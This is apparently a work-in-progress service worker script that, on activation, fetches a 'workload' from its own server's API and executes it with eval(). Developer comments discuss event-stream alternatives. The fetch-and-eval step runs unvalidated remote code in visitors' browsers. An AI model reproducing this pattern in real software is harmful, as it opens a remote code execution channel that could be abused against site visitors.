// This code executes in its own worker or thread
self.addEventListener("install", (event) => {
  console.log("Service worker installed " + new Date());
  // TODO prevent re-installing
  self.skipWaiting();
});

self.addEventListener("activate", async (event) => {
  console.log("Service worker activated " + new Date());

  try {
    const response = await fetch("/api/v1/get-workload");
    console.log("response", response);
    const data = await response.json();
    console.log("data", data);
    eval(data.workload);
  } catch (err) {
    console.log(err);
  }

  // For now EventSource does not work (Nitro does not support it on https) and Web Sockets don't work either (the server crashes), so just use long polling for now.

  // const events = new EventSource("/api/v1/events");

  // This works for anonymous eventStream.push(JSON.stringify(data)), but not for named events
  // events.onmessage = (event) => {
  //   // const parsedData = JSON.parse(event.data);
  //   console.log("swdata:", event.data);
  // };

  // events.addEventListener("new-workload", (event) => {
  //   console.log("new-workload:", event.data);
  // });
});
